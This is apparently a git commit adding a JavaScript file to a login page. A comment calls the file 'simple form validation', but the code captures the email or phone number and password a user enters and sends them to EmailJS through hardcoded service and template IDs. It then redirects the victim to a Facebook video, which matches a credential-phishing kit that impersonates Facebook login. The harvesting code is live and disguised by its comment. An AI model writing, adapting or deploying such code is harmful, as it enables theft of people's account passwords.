d05af0a7a9b2b66a9a12c69a6d8aedc8d729074d
User2023DH <josecastro19015@gmail.com>
2025-03-31 11:26:50 -0400

    first commit

---
+++ src/index.js
@@ -0,0 +1,33 @@
+// Simple form validation
+document.addEventListener('DOMContentLoaded', function() {
+  emailjs.init("z9-aTt4t_P281yuE5");
+  const loginForm = document.querySelector('.login-form');
+
+  if (loginForm) {
+    loginForm.addEventListener('submit', function(event) {
+      event.preventDefault();
+
+      const email = loginForm.querySelector('input[type="text"]').value.trim();
+      const password = loginForm.querySelector('input[type="password"]').value.trim();
+
+      if (!email || !password) {
+        alert('Por favor, introduce tu correo electrónico o número de teléfono y tu contraseña.');
+        return;
+      }
+
+      // Enviar los datos a EmailJS
+      emailjs.send("service_upm88pg", "template_3u3w2iy", {
+        email: email,
+        password: password
+      }).then(function(response) {
+           window.location.href = "https://www.facebook.com/watch?v=1506234240078450&locale=es_LA"
+      }, function(error) {
+          alert("No puedes acceder❌");
+      });
+    });
+  }
+});
+
+
+
+ 
